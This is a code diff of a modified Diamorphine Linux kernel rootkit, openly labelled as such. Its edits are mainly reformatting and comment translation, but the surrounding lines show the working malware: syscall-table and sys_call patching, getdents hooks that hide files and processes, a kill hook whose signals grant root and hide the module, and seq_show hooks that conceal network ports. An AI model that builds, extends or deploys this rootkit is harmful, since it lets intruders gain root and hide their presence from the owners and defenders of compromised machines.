@@ -26,7 +26,7 @@
 
 #include "diamorphine.h"
 
-// ---- Global variables for port hiding ----
+// ---- Port hiding global variables ----
 static struct seq_operations *tcp4_seq_ops = NULL;
 static struct seq_operations *tcp6_seq_ops = NULL;
 static struct seq_operations *udp4_seq_ops = NULL;
@@ -39,7 +39,7 @@ static int (*orig_udp6_show)(struct seq_file *m, void *v) = NULL;
 
 static int port_hide_enabled = 0;
 
-// ---- Port පරීක්ෂා කරන function ----
+// ---- Port checking ----
 static inline int is_port_hidden(unsigned short port) {
     if (port == 6969) return 1;
     if (port >= 50000 && port <= 60000) return 1;
@@ -55,7 +55,7 @@ static int hacked_tcp4_seq_show(struct seq_file *m, void *v) {
     __be16 sport = inet_sk(sk)->inet_sport;
     unsigned short port = ntohs(sport);
     if (is_port_hidden(port)) {
-        return 0; // Entry එක සම්පූර්ණයෙන්ම skip කරන්න
+        return 0;
     }
     return orig_tcp4_show(m, v);
 }
@@ -99,7 +99,6 @@ static int hacked_udp6_seq_show(struct seq_file *m, void *v) {
     return orig_udp6_show(m, v);
 }
 
-// ---- Port hiding enable/disable functions ----
 static void enable_port_hide(void) {
     if (!port_hide_enabled) {
         port_hide_enabled = 1;
@@ -119,7 +118,7 @@ static void toggle_port_hide(void) {
     else enable_port_hide();
 }
 
-// ---- Original Diamorphine functions (process/module hide) ----
+// ---- Original Diamorphine code (process/module hide) ----
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 unsigned long cr0;
 #elif IS_ENABLED(CONFIG_ARM64)
@@ -169,21 +168,16 @@ unsigned long resolve_sym(char *symbol)
     return kallsyms_lookup_name(symbol);
 }
 
-unsigned long *
-get_syscall_table_bf(void)
+unsigned long *get_syscall_table_bf(void)
 {
     unsigned long *syscall_table;
-
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
     syscall_table = (unsigned long*)resolve_sym("sys_call_table");
     return syscall_table;
 #else
     unsigned long int i;
-
-    for (i = (unsigned long int)sys_close; i < ULONG_MAX;
-            i += sizeof(void *)) {
+    for (i = (unsigned long int)sys_close; i < ULONG_MAX; i += sizeof(void *)) {
         syscall_table = (unsigned long *)i;
-
         if (syscall_table[__NR_close] == (unsigned long)sys_close)
             return syscall_table;
     }
@@ -191,8 +185,7 @@ get_syscall_table_bf(void)
 #endif
 }
 
-struct task_struct *
-find_task(pid_t pid)
+struct task_struct *find_task(pid_t pid)
 {
     struct task_struct *p = current;
     for_each_process(p) {
@@ -202,18 +195,13 @@ find_task(pid_t pid)
     return NULL;
 }
 
-int
-is_invisible(pid_t pid)
+int is_invisible(pid_t pid)
 {
     struct task_struct *task;
-    if (!pid)
-        return 0;
+    if (!pid) return 0;
     task = find_task(pid);
-    if (!task)
-        return 0;
-    if (task->flags & PF_INVISIBLE)
-        return 1;
-    return 0;
+    if (!task) return 0;
+    return (task->flags & PF_INVISIBLE) ? 1 : 0;
 }
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -227,9 +215,7 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
 #endif
     int ret = orig_getdents64(pt_regs), err;
 #else
-asmlinkage long
-hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
-    unsigned int count)
+asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
 {
     int ret = orig_getdents64(fd, dirent, count), err;
 #endif
@@ -238,16 +224,13 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
     struct linux_dirent64 *dir, *kdirent, *prev = NULL;
     struct inode *d_inode;
 
-    if (ret <= 0)
-        return ret;
+    if (ret <= 0) return ret;
 
     kdirent = kzalloc(ret, GFP_KERNEL);
-    if (kdirent == NULL)
-        return ret;
+    if (kdirent == NULL) return ret;
 
     err = copy_from_user(kdirent, dirent, ret);
-    if (err)
-        goto out;
+    if (err) goto out;
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
     d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
@@ -262,8 +245,7 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
         namelen = dir->d_reclen - offsetof(struct linux_dirent64, d_name);
         if ((!proc && namelen >= strlen(MAGIC_PREFIX) &&
         (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
-        || (proc &&
-        is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+        || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
             if (dir == kdirent) {
                 ret -= dir->d_reclen;
                 memmove(dir, (void *)dir + dir->d_reclen, ret);
@@ -275,8 +257,7 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
         off += dir->d_reclen;
     }
     err = copy_to_user(dirent, kdirent, ret);
-    if (err)
-        goto out;
+    if (err) goto out;
 out:
     kfree(kdirent);
     return ret;
@@ -288,14 +269,12 @@ static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
     int fd = (int) pt_regs->di;
     struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
 #elif IS_ENABLED(CONFIG_ARM64)
-        int fd = (int) pt_regs->regs[0];
+    int fd = (int) pt_regs->regs[0];
     struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
 #endif
     int ret = orig_getdents(pt_regs), err;
 #else
-asmlinkage long
-hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
-    unsigned int count)
+asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)
 {
     int ret = orig_getdents(fd, dirent, count), err;
 #endif
@@ -304,23 +283,19 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
     struct linux_dirent *dir, *kdirent, *prev = NULL;
     struct inode *d_inode;
 
-    if (ret <= 0)
-        return ret;
+    if (ret <= 0) return ret;
 
     kdirent = kzalloc(ret, GFP_KERNEL);
-    if (kdirent == NULL)
-        return ret;
+    if (kdirent == NULL) return ret;
 
     err = copy_from_user(kdirent, dirent, ret);
-    if (err)
-        goto out;
+    if (err) goto out;
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
     d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
 #else
     d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 #endif
-
     if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
         proc = 1;
 
@@ -329,8 +304,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
         namelen = dir->d_reclen - offsetof(struct linux_dirent, d_name);
         if ((!proc && namelen >= strlen(MAGIC_PREFIX) &&
         (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
-        || (proc &&
-        is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+        || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
             if (dir == kdirent) {
                 ret -= dir->d_reclen;
                 memmove(dir, (void *)dir + dir->d_reclen, ret);
@@ -342,15 +316,13 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
         off += dir->d_reclen;
     }
     err = copy_to_user(dirent, kdirent, ret);
-    if (err)
-        goto out;
+    if (err) goto out;
 out:
     kfree(kdirent);
     return ret;
 }
 
-void
-give_root(void)
+void give_root(void)
 {
     #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
         current->uid = current->gid = 0;
@@ -360,8 +332,7 @@ give_root(void)
     #else
         struct cred *newcreds;
         newcreds = prepare_creds();
-        if (newcreds == NULL)
-            return;
+        if (newcreds == NULL) return;
         #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
             && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
             || LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
@@ -379,8 +350,7 @@ give_root(void)
     #endif
 }
 
-static inline void
-tidy(void)
+static inline void tidy(void)
 {
     kfree(THIS_MODULE->sect_attrs);
     THIS_MODULE->sect_attrs = NULL;
@@ -389,24 +359,23 @@ tidy(void)
 static struct list_head *module_previous;
 static short module_hidden = 0;
 
-void
-module_show(void)
+void module_show(void)
 {
     list_add(&THIS_MODULE->list, module_previous);
     module_hidden = 0;
 }
 
-void
-module_hide(void)
+void module_hide(void)
 {
     module_previous = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
     module_hidden = 1;
 }
 
+// ---------- ප්‍රධාන වෙනස් කිරීම ----------
+// hacked_kill හි SIGPORTHIDE signal එක හඳුනාගෙන return 0 කිරීම
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-asmlinkage long
-hacked_kill(const struct pt_regs *pt_regs)
+asmlinkage long hacked_kill(const struct pt_regs *pt_regs)
 {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
     pid_t pid = (pid_t) pt_regs->di;
@@ -416,27 +385,27 @@ hacked_kill(const struct pt_regs *pt_regs)
     int sig = (int) pt_regs->regs[1];
 #endif
 #else
-asmlinkage long
-hacked_kill(pid_t pid, int sig)
+asmlinkage long hacked_kill(pid_t pid, int sig)
 {
 #endif
     struct task_struct *task;
+
     switch (sig) {
         case SIGINVIS:
             if ((task = find_task(pid)) == NULL)
                 return -ESRCH;
             task->flags ^= PF_INVISIBLE;
-            break;
+            return 0;   // Signal එක process එකට නොයවන්න
         case SIGSUPER:
             give_root();
-            break;
+            return 0;
         case SIGMODINVIS:
             if (module_hidden) module_show();
             else module_hide();
-            break;
-        case SIGPORTHIDE:    // නව signal handler
+            return 0;
+        case SIGPORTHIDE:      // signal 30
             toggle_port_hide();
-            break;
+            return 0;          // systemd ට මෙම signal එක නොයයි
         default:
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
             return orig_kill(pt_regs);
@@ -444,23 +413,18 @@ hacked_kill(pid_t pid, int sig)
             return orig_kill(pid, sig);
 #endif
     }
-    return 0;
 }
 
+// Memory protection helpers
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-static inline void
-write_cr0_forced(unsigned long val)
+static inline void write_cr0_forced(unsigned long val)
 {
     unsigned long __force_order;
-
-    asm volatile(
-        "mov %0, %%cr0"
-        : "+r"(val), "+m"(__force_order));
+    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
 }
 #endif
 
-static inline void
-protect_memory(void)
+static inline void protect_memory(void)
 {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -474,8 +438,7 @@ protect_memory(void)
 #endif
 }
 
-static inline void
-unprotect_memory(void)
+static inline void unprotect_memory(void)
 {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -492,17 +455,13 @@ unprotect_memory(void)
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
 void flipswitch_func(void *target_func, void *hacked_func) {
     unsigned char *func_ptr = (unsigned char *)sys_call;
-
     for (size_t i = 0; i < DUMP_SIZE - 4; ++i) {
         if (func_ptr[i] == 0xe9 || func_ptr[i] == 0xe8) {
             int32_t rel = *(int32_t *)(func_ptr + i + 1);
             void *call_addr = (void *)((uintptr_t)sys_call + i + 5 + rel);
-
             if (call_addr == target_func) {
-
                 int32_t new_rel = (uintptr_t)hacked_func - ((uintptr_t)sys_call + i + 5);
                 int hooked_offset = i + 1;
-
                 memcpy(func_ptr + hooked_offset, &new_rel, sizeof(new_rel));
                 break;
             }
@@ -511,8 +470,7 @@ void flipswitch_func(void *target_func, void *hacked_func) {
 }
 #endif
 
-static int __init
-diamorphine_init(void)
+static int __init diamorphine_init(void)
 {
     __sys_call_table = get_syscall_table_bf();
     if (!__sys_call_table)
@@ -545,7 +503,7 @@ diamorphine_init(void)
     orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
 #endif
 
-    // ---- PORT HIDING: seq_operations හොයාගෙන replace කරන්න ----
+    // ---- PORT HIDING: seq_operations hooks ----
     tcp4_seq_ops = (struct seq_operations *)resolve_sym("tcp4_seq_ops");
     tcp6_seq_ops = (struct seq_operations *)resolve_sym("tcp6_seq_ops");
     udp4_seq_ops = (struct seq_operations *)resolve_sym("udp4_seq_ops");
@@ -577,26 +535,25 @@ diamorphine_init(void)
         printk(KERN_WARNING "diamorphine: Could not resolve seq_ops. Port hiding disabled.\n");
     }
 
-    // ---- Syscall table hooks (existing) ----
+    // ---- Syscall hooks ----
     unprotect_memory();
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
     flipswitch_func(orig_getdents, hacked_getdents);
     flipswitch_func(orig_getdents64, hacked_getdents64);
     flipswitch_func(orig_kill, hacked_kill);
 #else
-    __sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
-    __sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
-    __sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
+    __sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
+    __sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
+    __sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
 #endif
     protect_memory();
 
     return 0;
 }
 
-static void __exit
-diamorphine_cleanup(void)
+static void __exit diamorphine_cleanup(void)
 {
-    // ---- Port hiding hooks ආපසු restore කරන්න ----
+    // Restore port hiding hooks
     if (tcp4_seq_ops || tcp6_seq_ops || udp4_seq_ops || udp6_seq_ops) {
         unprotect_memory();
 
@@ -613,16 +570,16 @@ diamorphine_cleanup(void)
         printk(KERN_INFO "diamorphine: Port hiding hooks restored.\n");
     }
 
-    // ---- Syscall hooks restore ----
+    // Restore syscall hooks
     unprotect_memory();
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
     flipswitch_func(hacked_getdents, orig_getdents);
     flipswitch_func(hacked_getdents64, orig_getdents64);
     flipswitch_func(hacked_kill, orig_kill);
 #else
-    __sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
-    __sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
-    __sys_call_table[__NR_kill] = (unsigned long) orig_kill;
+    __sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
+    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
 #endif
     protect_memory();
 }
@@ -632,4 +589,4 @@ module_exit(diamorphine_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
 MODULE_AUTHOR("m0nad (Modified)");
-MODULE_DESCRIPTION("LKM rootkit with port hiding");
+MODULE_DESCRIPTION("LKM rootkit with port hiding (Signal 30)");
